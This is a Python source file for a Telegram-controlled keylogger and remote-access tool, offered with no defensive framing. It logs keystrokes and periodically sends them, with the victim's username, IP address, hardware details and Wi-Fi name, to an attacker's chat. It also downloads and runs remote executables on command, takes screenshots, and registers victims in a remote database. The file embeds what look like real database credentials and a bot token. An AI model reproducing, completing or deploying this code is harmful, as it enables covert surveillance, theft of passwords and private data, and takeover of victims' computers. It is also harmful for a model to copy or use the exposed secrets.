import os
import traceback
import mysql.connector
import socket
import platform
import requests
import subprocess
import telegram
import html
import threading
import time
import urllib.request
import psutil
import pyautogui
from pynput.keyboard import Listener
from telegram.ext import Updater, CommandHandler


db = mysql.connector.connect(
    host="keybot-do-user-15841415-0.c.db.ondigitalocean.com",
    user="doadmin",
    port=25060,  # Port should be specified separately
    password="AVNS_rCVddLVOf-AuR6-Zj24",
    database="defaultdb",
)


your_chat_id = "5112027572"


def add_user():
    """Add the computer username along with the fixed chat ID to the database."""
    cursor = db.cursor()
    username = get_username()

    # Check if the user already exists in the database
    select_query = "SELECT * FROM users WHERE username = %s"
    cursor.execute(select_query, (username,))
    result = cursor.fetchone()

    # If the user doesn't exist, insert it into the database
    if not result:
        insert_query = "INSERT INTO users (username, chat_id) VALUES (%s, %s)"
        cursor.execute(insert_query, (username, your_chat_id))
        db.commit()
        print("User added successfully.")
    else:
        print("User already exists in the database.")

    cursor.close()


def get_chat_id_by_username(username):
    cursor = db.cursor()
    select_query = "SELECT chat_id FROM users WHERE username = %s"
    cursor.execute(select_query, (username,))
    result = cursor.fetchone()
    if result:
        chat_id = result[0]
    else:
        chat_id = None
    cursor.close()  # Move cursor closing after fetching the result
    return chat_id


# Initialize the Telegram bot
bot_token = "6478381431:AAEnkPMOBClnNks-rlfCMjE2fnoXuxjoIdE"  # Replace with your actual bot token
bot = telegram.Bot(token=bot_token)

# Set up the keylog file
keylog_file = "keylogs.txt"


def get_system_uptime():
    uptime_seconds = int(time.time() - psutil.boot_time())
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{hours}h {minutes}m {seconds}s"


def escape_special_characters(text):
    return html.escape(text, quote=False).replace("'", "&#39;")


def get_public_ip():
    try:
        ip = requests.get("https://api.ipify.org").text
        return ip
    except requests.ConnectionError:
        return "No internet connection."


def get_ram_info():
    try:
        import psutil

        ram = psutil.virtual_memory().total / (1024**3)  # Convert to GB
        return f"{ram:.2f} GB"
    except ImportError:
        return "psutil module not installed."


def get_graphics_card_info():
    try:
        if platform.system() == "Windows":
            info = subprocess.check_output(
                "wmic path win32_VideoController get name", shell=True
            ).decode()
            return info.strip().split("\n")[1]  # Assuming the first line is the header
        else:
            return "Unsupported platform for GPU info."
    except subprocess.CalledProcessError:
        return "Failed to get GPU info."


def get_wifi_ssid():
    try:
        if platform.system() == "Windows":
            wifi_name = subprocess.check_output(
                ["netsh", "wlan", "show", "interfaces"]
            ).decode("utf-8", "ignore")
            for line in wifi_name.split("\n"):
                if "SSID" in line:
                    return line.split(":")[1].strip()
        else:
            return "Unsupported platform for Wi-Fi SSID."
    except subprocess.CalledProcessError:
        return "Failed to get Wi-Fi SSID."


def get_username():
    return os.getlogin()


def get_hardware_info():
    info = {
        "Processor": platform.processor(),
        "System": platform.system(),
        "Release": platform.release(),
        "Version": platform.version(),
    }
    return "\n".join(f"{key}: {value}" for key, value in info.items())


def send_logs_periodically():
    while True:
        # Capture keylogs for 15 seconds
        time.sleep(15)
        logs = get_logs_from_file()
        send_logs(logs)
        clean_keylog_file()


def get_logs_from_file():
    with open(keylog_file, "r") as f:
        return f.read()


def send_logs(logs):
    if logs:
        username = get_username()
        public_ip = get_public_ip()
        hardware_info = get_hardware_info()
        ram_info = get_ram_info()
        graphics_info = get_graphics_card_info()
        wifi_ssid = get_wifi_ssid()

        message = (
            f"<b>👤 Username:</b> {username}\n"
            f"<b>🌐 Public IP:</b> {public_ip}\n\n"
            f"<b>💻 Hardware Info</b>\n"
            f"<code>{escape_special_characters(hardware_info)}</code>\n"
            f"<b>🧠 RAM:</b> {ram_info}\n"
            f"<b>🎮 Graphics Card:</b> {graphics_info}\n"
            f"<b>📶 Wi-Fi SSID:</b> {wifi_ssid}\n\n"
            f"<b>🔍 Logs:</b>\n<pre>{escape_special_characters(logs)}</pre>"
        )

        print("Sending logs:", message)
        # Ensure to use parse_mode='HTML' to properly format the message
        bot.send_message(chat_id="5112027572", text=message, parse_mode="HTML")
    else:
        print("No logs to send")


def on_press(key):
    with open(keylog_file, "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(f" [{key}] ")


def clean_keylog_file():
    with open(keylog_file, "w") as f:
        f.write("")


def start_listener():
    with Listener(on_press=on_press) as listener:
        listener.join()


def start_bot():
    updater = Updater(bot_token, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("agents", send_available_agents))
    dp.add_handler(CommandHandler("inject", inject_file))
    dp.add_handler(
        CommandHandler("screenshot", take_screenshot)
    )  # New command handler for screenshot
    updater.start_polling()
    updater.idle()


def get_ip():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address


def get_connected_time():
    connected_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    return connected_time


def get_system_uptime():
    uptime_seconds = int(time.time() - psutil.boot_time())
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"


def send_available_agents(update, context):
    # Check if the command is coming from the specific chat ID
    if update.message.chat_id == 5112027572:  # Replace with your specific chat ID
        username = get_username()
        ip_address = get_ip()
        os_info = platform.platform()
        connected_from = get_connected_time()
        uptime = get_system_uptime()

        message = (
            f"<b>👤 Username:</b> <code>{username}</code>\n"
            f"<b>🌐 Public IP:</b> <code>{ip_address}</code>\n"
            f"<b>⏰ Connected From:</b> <code>{connected_from}</code>\n"
            f"<b>🕰 Uptime:</b> <code>{uptime}</code>\n"
            f"<b>💻 OS:</b> <code>{os_info}</code>"
        )

        context.bot.send_message(
            chat_id=update.message.chat_id, text=message, parse_mode="HTML"
        )


def start_bot():
    updater = Updater(bot_token, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("agents", send_available_agents))
    dp.add_handler(CommandHandler("inject", inject_file))
    dp.add_handler(
        CommandHandler("screenshot", take_screenshot)
    )  # New command handler for screenshot
    updater.start_polling()
    updater.idle()


def inject_file(update, context):
    if update.message and str(update.message.chat_id) == your_chat_id:
        args = context.args
        if len(args) != 3:  # Expecting three arguments: file_url, mode, username
            update.message.reply_text(
                "Invalid usage. Usage: /inject <file_url> <background|normal> <username>"
            )
            return

        file_url = args[0].strip('"')  # Remove double quotes from the URL string
        mode = args[1].lower()
        target_username = args[2]

        if mode not in ["background", "normal"]:
            update.message.reply_text(
                "Invalid mode. Mode must be 'background' or 'normal'."
            )
            return

        # Get the chat ID of the target user
        target_chat_id = get_chat_id_by_username(target_username)

        if target_chat_id is None:
            update.message.reply_text(f"User '{target_username}' not found.")
            return

        # Download the file using requests
        try:
            response = requests.get(file_url)
            response.raise_for_status()  # Raise an error if the response status is not OK
            with open("downloaded_file.exe", "wb") as f:
                f.write(response.content)
        except Exception as e:
            update.message.reply_text(f"Failed to download the file: {e}")
            return

        # Run the file based on the mode
        try:
            if mode == "background":
                subprocess.Popen(["downloaded_file.exe"], shell=True)
                update.message.reply_text(
                    "File injected and running in the background."
                )
            else:
                subprocess.run(["downloaded_file.exe"], shell=True, check=True)
                update.message.reply_text("File injected and executed normally.")
        except subprocess.CalledProcessError as e:
            update.message.reply_text(f"Failed to execute the file: {e}")
        finally:
            # Remove the downloaded file
            if os.path.exists("downloaded_file.exe"):
                os.remove("downloaded_file.exe")


def capture_screenshot(username):
    """Capture a screenshot of the specified agent."""
    cursor = db.cursor()
    try:
        # Get the chat ID of the target user
        target_chat_id = get_chat_id_by_username(username)

        if target_chat_id is None:
            return f"User '{username}' not found."

        # Send a message indicating that the screenshot process has started
        bot.send_message(chat_id=target_chat_id, text="📸 Taking screenshot...")

        # Add a small delay before capturing the screenshot
        time.sleep(1)

        # Capture screenshot
        screenshot_path = f"{username}_screenshot.png"
        pyautogui.screenshot(screenshot_path)

        # Wait for 1 minute before sending the screenshot
        time.sleep(3)

        # Send the screenshot to the target agent
        bot.send_photo(chat_id=target_chat_id, photo=open(screenshot_path, "rb"))

        # Remove the screenshot file
        os.remove(screenshot_path)

        return f"📸 Screenshot for user {username} has been sent successfully."
    except Exception as e:
        # Print traceback to understand the cause of the exception
        traceback.print_exc()
        return f"❌ Failed to capture and send screenshot for user '{username}': {str(e)}"  # Ensure to return the error message as a string
    finally:
        cursor.close()


def take_screenshot(update, context):
    """Handler for the /screenshot command."""
    if update.message and str(update.message.chat_id) == your_chat_id:
        args = context.args
        if len(args) != 1:  # Expecting one argument: username
            update.message.reply_text("Invalid usage. Usage: /screenshot <username>")
            return

        username = args[0]
        screenshot_result = capture_screenshot(username)
        update.message.reply_text(screenshot_result)


if __name__ == "__main__":
    # Add the user when the script is first executed
    add_user()
    # Start the threads and bot as before
    threading.Thread(target=start_listener).start()
    threading.Thread(target=send_logs_periodically).start()
    start_bot()
